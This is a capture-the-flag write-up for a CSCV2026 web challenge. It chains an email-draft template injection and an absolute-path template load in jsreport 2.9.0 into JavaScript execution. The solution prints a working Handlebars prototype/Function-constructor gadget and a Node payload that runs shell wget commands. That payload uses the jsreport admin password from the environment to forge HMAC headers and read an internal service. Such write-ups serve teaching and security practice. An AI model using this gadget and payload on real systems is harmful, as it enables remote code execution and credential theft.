---
title: "Tra cứu điểm thi (diemthi)"
ctf: "CSCV2026"
date: 2026-09-27
category: web
difficulty: hard
points: "unknown"
flag_format: "challenge-specific asset response"
author: "Datnix"
---

# Tra cứu điểm thi

## Summary

The application exposes two linked primitives: `/api/email` reflects an attacker-controlled greeting into a generated `.eml` draft, and `/api/export` accepts an absolute template path. The draft can therefore be rendered by jsreport as a Handlebars template. A Handlebars prototype/constructor gadget then executes JavaScript inside the jsreport process, where it authenticates to the internal asset service and returns its contents in the PDF.

The checked-in local fixture returns `CSCV2026{TEST_FLAG}` from `internal-storage/assets.txt`. This is the verified local flag after configuring the fixture. The repository's `data/flag.txt` is a fake file created during local experimentation and is not used by this solve or treated as the organizer's flag.

## Environment

Start the challenge with:

```bash
python3 init-runtime.py
docker compose up -d --build
```

The public service is `http://127.0.0.1:3000`. The relevant services are:

- `diemthi`: the public Express application;
- `diemthi-jsreport`: jsreport 2.9.0 running Handlebars and Chromium;
- `diemthi-internal-storage`: a nonce/HMAC-protected HTTP asset service.

The internal service uses the generated jsreport password as its HMAC key. It exposes `GET /challenge` for a nonce and accepts `POST /assets/` only with the correct `Origin`, nonce, and `X-Report-Proof` headers.

## Solution

### Step 1: Turn email delivery into a template staging primitive

`server/mail.js` uses Nodemailer's stream transport when `SMTP_HOST` is unset and writes the complete message to `data/mail-drafts/<timestamp>-<filename>.eml`. `/api/email` returns that filename.

The local application must be allowed to reach this documented draft branch. The early no-SMTP `503` return in the local app was removed from `server/index.js`; otherwise the route stops before `sendScoreMail()` and no draft is created. SMTP should remain unset for this solve: configuring SMTP selects `mode: sent` and removes the useful draft filename from the response.

The `name` field is compiled into both the plain-text and HTML email bodies. The payload uses no HTML tags, so it survives the sanitizer, and each Handlebars expression is isolated on a padded line:

```handlebars
{{#with (O.getOwnPropertyDescriptors (O.getPrototypeOf a)) as |D|}}
{{#with (@root.O.getPrototypeOf @root) as |P|}}
{{@root.O.defineProperties P D}}
{{@root.O.assign P @root.y}}
{{/with}}
{{/with}}
{{#with (O.getOwnPropertyDescriptor (O.getPrototypeOf O) c)}}
{{@root.O.defineProperty @root "F" this}}
{{/with}}
{{#with (F)}}{{.}}{{/with}}
```

The padding matters because the generated MIME body is quoted-printable encoded. Without it, `=` characters and soft line wraps can split a Handlebars tag. Keeping each tag below roughly 71 characters also prevents the HTML copy's `<br>` suffix from splitting it.

### Step 2: Render the draft and execute the jsreport gadget

`loadTemplate()` rejects names containing `..`, but it does not reject absolute paths. The filename returned by `/api/email` can therefore be supplied to `/api/export` as:

```text
/app/data/mail-drafts/<returned-filename>.eml
```

The data object is:

```json
{
  "$id": "r",
  "O": {"$ref": "constructor"},
  "a": [],
  "c": "constructor",
  "y": {"0": "<JavaScript payload>", "length": 1}
}
```

The important details are:

1. The reference resolver's `byid` object inherits `constructor`, so `O` resolves to the real `Object` function.
2. `O.getPrototypeOf a` gives `Array.prototype` without using the blocked `constructor.prototype` expression.
3. `O.getPrototypeOf @root` is the prototype used by the Handlebars root context. Copying the Array descriptors there and assigning the array-like `y` object makes the helper options stringify as the supplied JavaScript.
4. `O.getOwnPropertyDescriptor (O.getPrototypeOf O) c` obtains the `Function` constructor descriptor from `Function.prototype`, and the next block invokes it.

The payload first removes the enumerable properties added by Handlebars' extra helper-options argument. This cleanup is essential: otherwise Node 12's `child_process` environment enumeration inherits values such as `name`, `hash`, `data`, `blockParams`, and `loc`, causing `Cannot convert object to primitive value`.

The payload uses `execSync` rather than `execFileSync`. The command-string form avoids the polluted argument-array path:

```javascript
delete Object.prototype[0];
delete Object.prototype.name;
delete Object.prototype.hash;
delete Object.prototype.data;
delete Object.prototype.blockParams;
delete Object.prototype.loc;
delete Object.prototype.length;
Object.defineProperty(Object.prototype, 'constructor', {
  value: Object,
  writable: true,
  configurable: true
});

const cp = process.mainModule.require('child_process');
const crypto = process.mainModule.require('crypto');
const nonce = JSON.parse(
  cp.execSync('wget -qO- http://internal-storage/challenge').toString()
).nonce;
const proof = crypto
  .createHmac('sha256', process.env.extensions_authentication_admin_password)
  .update(nonce)
  .digest('hex');

return cp.execSync(
  "wget -qO- " +
  "--header='Origin: http://diemthi/' " +
  "--header='X-Asset-Nonce: " + nonce + "' " +
  "--header='X-Report-Proof: " + proof + "' " +
  "--post-data='' http://internal-storage/assets/"
).toString();
```

The nonce is single-use, so the challenge request and authenticated asset request must occur in the same execution. The result is inserted into the rendered email text and is consequently visible in the downloaded PDF.

### Step 3: Run the complete solver

The repository's [solve.py](solve.py) performs both HTTP stages, saves the PDF, extracts its text with `pdftotext` when available, and prints the recovered result:

```bash
python3 solve.py http://127.0.0.1:3000 --out e2e-final.pdf
```

The solver sends this sequence:

```text
POST /api/email
  name = padded Handlebars gadget
  data = {}
        ↓
  response = {mode: "draft", file: "...eml"}

POST /api/export
  template = /app/data/mail-drafts/<file>
  data = {$id, O:$ref(constructor), a:[], c:"constructor", y:{0:JS,length:1}}
        ↓
  jsreport executes the Function-constructor gadget
        ↓
  internal-storage validates nonce + HMAC
        ↓
  the asset bytes are rendered in the PDF
```

Verified local run:

```text
[+] draft: <timestamp>-score-report-export.eml
[+] PDF: e2e-final.pdf (67885 bytes)
[+] authenticated asset response: CSCV2026{TEST_FLAG}
```

The marker appears twice because the `.eml` contains both the plain-text and HTML copies of the injected name.

## Dead ends and pivots

- A plain absolute-path export is only a staging/file-read primitive; it does not explain the intended internal-storage authentication.
- Putting the JavaScript directly in `name` failed because Nodemailer's quoted-printable encoding rewrote `=` as `=3D` and inserted soft wraps.
- The initial `p: {"$ref":"__proto__"}` target was the host `Object.prototype`, not the prototype used by the Handlebars helper context. The reliable target is `O.getPrototypeOf @root`.
- `a.constructor.prototype` is blocked by Handlebars. `O.getPrototypeOf a` provides the same Array prototype without that lookup.
- Binding `O.getPrototypeOf O` directly with `#with` makes Handlebars treat `Function.prototype` as a lambda. Reading its `constructor` descriptor directly avoids that behavior.
- `execFileSync()` and an uncleaned `execSync()` reached JavaScript execution but failed inside Node 12's argument/environment normalization. Cleaning the inherited fields and using the command-string API fixes it.

## Flag / local recovered value

```text
CSCV2026{TEST_FLAG}
```

This is the content of the checked-in `internal-storage/assets.txt` fixture and the value returned by the verified authenticated chain. The local `data/flag.txt` file was explicitly treated as a fake artifact and not used.
